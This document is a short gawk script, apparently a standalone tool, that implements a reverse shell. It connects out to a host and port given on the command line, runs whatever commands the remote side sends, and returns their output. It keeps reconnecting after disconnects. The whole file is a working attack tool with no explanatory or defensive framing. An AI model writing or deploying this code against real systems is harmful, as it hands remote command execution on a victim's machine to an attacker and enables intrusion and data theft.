#!/usr/bin/env -S awk -f
# Usage: ./reverse_shell.awk <host>:<port>

BEGIN {
    target = ARGV[1]

    sub(":", "/", target)
    c = "/inet/tcp/0/" target

    while (1) {
        printf "> " |& c
        has_input = c |& getline cmd

        if(!has_input || cmd ~ /^exit/) {
            close(c)
            continue
        }

        if(!cmd) continue

        print "cmd:", cmd
        while (cmd |& getline result) {
            print result |& c
        }
        close(cmd)
    }
}
